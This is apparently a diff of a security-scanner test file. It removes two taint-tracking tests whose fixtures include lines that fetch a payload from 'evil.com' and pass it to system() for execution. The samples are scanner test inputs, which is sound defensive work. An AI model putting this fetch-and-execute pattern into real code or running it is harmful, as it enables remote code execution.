@@ -65,20 +65,10 @@ def test_obfuscation_entropy_detection(lens):
 
 
 # ==============================================================================
-# TEST 3: DATA FLOW TAINT TRACKING (Left-Hand Side Assignment)
+# TEST 3: (removed) DATA FLOW TAINT TRACKING -- taint compute removed in #3101
+# (score-dead since #1020, ~0% precision/recall). The auto-gen shield test below
+# still asserts tainted_injection is absent/0, which now holds unconditionally.
 # ==============================================================================
-def test_data_flow_taint_tracking(lens):
-    """Proves the engine can track multi-line taint from I/O sinks to execution sinks (RCE)."""
-    code = (
-        "// Standard Tainted Injection (Multi-line)\n"
-        "let user_input = fetch('http://evil.com/payload');\n"
-        "system(user_input);\n"
-    )
-
-    result = lens.scan_content(code)
-    counts = result["counts"]
-
-    assert counts.get("tainted_injection", 0) > 0, "Failed to track I/O -> Danger taint path!"
 
 
 # ==============================================================================
@@ -259,40 +249,10 @@ def test_minified_fallback_near_miss_threshold(lens):
 
 
 # ==============================================================================
-# TEST 9: ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
+# TEST 9: (removed) ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
+# The LHS taint extractor was removed in #3101 (score-dead since #1020,
+# ~0% precision/recall), so this adversarial trap no longer applies.
 # ==============================================================================
-
-
-def test_adversarial_lhs_comparison_trap(lens):
-    """
-    [ADVERSARIAL TRAP] Proves that the Left-Hand Side (LHS) variable extractor
-    does not hallucinate on comparison operators (==, ===, !=, <=).
-    """
-    payload = """
-    // Trap 1: Strict equality comparison
-    if (status === 200) { console.log('OK'); }
-    
-    // Trap 2: Inequality comparison
-    if (user_input !== "admin") { die(); }
-    
-    // Trap 3: Less than or equal
-    if (retry_count <= 5) { retry(); }
-    
-    // Trap 4: String literal containing an assignment operator
-    const endpoint = "https://api.example.com/?auth=" + token;
-    
-    // Actual Taint: This is the ONLY one that should trigger the flow
-    let malicious_data = fetch('http://evil.com/payload');
-    system(malicious_data);  // <--- Changed to system() to guarantee a valid execution sink
-    """
-
-    result = lens.scan_content(payload)
-    counts = result["counts"]
-    snippets = str(result["snippets"])
-
-    assert counts.get("tainted_injection", 0) == 1, "LHS extractor failed to track the legitimate taint flow!"
-    assert "malicious_data" in snippets, "Failed to capture the correct tainted variable!"
-    assert "status" not in snippets, "LHS extractor hallucinated on '==='!"
 
 
 # ==============================================================================
